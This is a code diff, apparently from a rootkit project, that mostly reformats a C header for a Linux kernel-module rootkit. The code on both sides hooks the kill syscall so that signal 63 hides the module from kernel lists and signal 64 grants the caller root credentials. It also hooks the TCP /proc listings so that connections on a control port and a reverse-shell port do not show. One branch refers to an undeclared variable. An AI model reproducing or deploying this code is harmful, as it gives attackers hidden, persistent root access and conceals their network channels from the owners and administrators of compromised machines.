@@ -3,6 +3,7 @@
 
 #pragma once
 #include <linux/kallsyms.h>
+//
 #include <linux/dirent.h>
 #include <linux/tcp.h>
 #include <linux/version.h>
@@ -10,10 +11,10 @@
 #ifdef CONFIG_X86_64
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 17, 0)
 #define PTREGS_SYSCALL_STUB 1
-typedef asmlinkage long( * ptregs_t)(const struct pt_regs * regs);
+typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
 static ptregs_t orig_kill;
 #else
-typedef asmlinkage long( * orig_kill_t)(pid_t pid, int sig);
+typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
 static orig_kill_t orig_kill;
 #endif
 #endif
@@ -22,114 +23,112 @@ static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
 
 enum SIGS {
-    SIGINVIS = 63, // hide procces kill 63 1
-    SIGROOT = 64, // spawn root shell kill 64 1
+  SIGINVIS = 63, // hide procces kill 63 1
+  SIGROOT = 64,  // spawn root shell kill 64 1
 };
 
-static struct list_head * prev_module;
-static struct list_head * prev_kobj;
+static struct list_head *prev_module;
+static struct list_head *prev_kobj;
 static short hidden = 0;
 
 void root(void);
 void root(void) {
-    struct cred * creds;
-    creds = prepare_creds();
-    if (creds == NULL) {
-        return;
-    }
-    creds -> uid.val = creds -> gid.val = 0;
-    creds -> euid.val = creds -> egid.val = 0;
-    creds -> suid.val = creds -> sgid.val = 0;
-    creds -> fsuid.val = creds -> fsgid.val = 0;
-    commit_creds(creds);
+  struct cred *creds;
+  creds = prepare_creds();
+  if (creds == NULL) {
+    return;
+  }
+  creds->uid.val = creds->gid.val = 0;
+  creds->euid.val = creds->egid.val = 0;
+  creds->suid.val = creds->sgid.val = 0;
+  creds->fsuid.val = creds->fsgid.val = 0;
+  commit_creds(creds);
 }
 
 static inline void hide_module(void) {
-    prev_module = THIS_MODULE -> list.prev;
-    list_del( & THIS_MODULE -> list);
+  prev_module = THIS_MODULE->list.prev;
+  list_del(&THIS_MODULE->list);
 
-    prev_kobj = THIS_MODULE -> mkobj.kobj.entry.prev;
-    list_del( & THIS_MODULE -> mkobj.kobj.entry);
-    hidden = 1;
-    printk(KERN_INFO "Hiding LKM\n");
+  prev_kobj = THIS_MODULE->mkobj.kobj.entry.prev;
+  list_del(&THIS_MODULE->mkobj.kobj.entry);
+  hidden = 1;
+  printk(KERN_INFO "Hiding LKM\n");
 }
 
 static inline void show_module(void) {
-    list_add( & THIS_MODULE -> list, prev_module);
-    list_add( & THIS_MODULE -> mkobj.kobj.entry, prev_kobj);
-    hidden = 0;
-    printk(KERN_INFO "Unhiding LKM\n");
+  list_add(&THIS_MODULE->list, prev_module);
+  list_add(&THIS_MODULE->mkobj.kobj.entry, prev_kobj);
+  hidden = 0;
+  printk(KERN_INFO "Unhiding LKM\n");
 }
 
 #if PTREGS_SYSCALL_STUB
-static asmlinkage long hook_kill(const struct pt_regs * regs) {
-    int sig = regs -> si;
+static asmlinkage long hook_kill(const struct pt_regs *regs) {
+  int sig = regs->si;
 
-    switch (sig) {
-    case SIGINVIS:
-        if (hidden)
-            show_module();
-        else
-            hide_module();
-        break;
-    case SIGROOT:
-        root();
-        break;
-    default:
-        return orig_kill(regs);
-    }
-    return 0;
+  switch (sig) {
+  case SIGINVIS:
+    if (hidden)
+      show_module();
+    else
+      hide_module();
+    break;
+  case SIGROOT:
+    root();
+    break;
+  default:
+    return orig_kill(regs);
+  }
+  return 0;
 }
 #else
 
 static asmlinkage long hook_kill(pid_t pid, int sig) {
-    switch (sig) {
-    case SIGINVIS:
-        if (hidden)
-            show_module();
-        else
-            hide_module();
-        break;
-    case SIGROOT:
-        root();
-        break;
-    default:
-        return orig_kill(regs);
-    }
-    return 0;
+  switch (sig) {
+  case SIGINVIS:
+    if (hidden)
+      show_module();
+    else
+      hide_module();
+    break;
+  case SIGROOT:
+    root();
+    break;
+  default:
+    return orig_kill(regs);
+  }
+  return 0;
 }
 #endif
 
-static asmlinkage long hook_tcp6(struct seq_file *seq, void *v){
-    struct inet_sock *sock;
-    unsigned short communication_port = htons(1337);
+static asmlinkage long hook_tcp6(struct seq_file *seq, void *v) {
+  struct inet_sock *sock;
+  unsigned short communication_port = htons(1337);
 
-    if(v != SEQ_START_TOKEN){
-        sock = (struct inet_sock *)v;
-        if(communication_port == sock->inet_sport ||
-            communication_port == sock->inet_dport)
-        {
-            return 0;
-        }
+  if (v != SEQ_START_TOKEN) {
+    sock = (struct inet_sock *)v;
+    if (communication_port == sock->inet_sport ||
+        communication_port == sock->inet_dport) {
+      return 0;
     }
-    return orig_tcp6_seq_show(seq,v);
+  }
+  return orig_tcp6_seq_show(seq, v);
 }
 
-static asmlinkage long hook_tcp4(struct seq_file *seq, void *v){
-    struct inet_sock *sock;
-    unsigned short communication_port = htons(1337);
-    unsigned short revshell_port = htons(1338);
+static asmlinkage long hook_tcp4(struct seq_file *seq, void *v) {
+  struct inet_sock *sock;
+  unsigned short communication_port = htons(1337);
+  unsigned short revshell_port = htons(1338);
 
-    if(v != SEQ_START_TOKEN){
-        sock = (struct inet_sock *)v;
-        if(communication_port == sock->inet_sport ||
-            communication_port == sock->inet_dport ||
-            revshell_port == sock->inet_sport ||
-            revshell_port == sock->inet_dport)
-        {
-            return 0;
-        }
+  if (v != SEQ_START_TOKEN) {
+    sock = (struct inet_sock *)v;
+    if (communication_port == sock->inet_sport ||
+        communication_port == sock->inet_dport ||
+        revshell_port == sock->inet_sport ||
+        revshell_port == sock->inet_dport) {
+      return 0;
     }
-    return orig_tcp4_seq_show(seq,v);
+  }
+  return orig_tcp4_seq_show(seq, v);
 }
 #endif
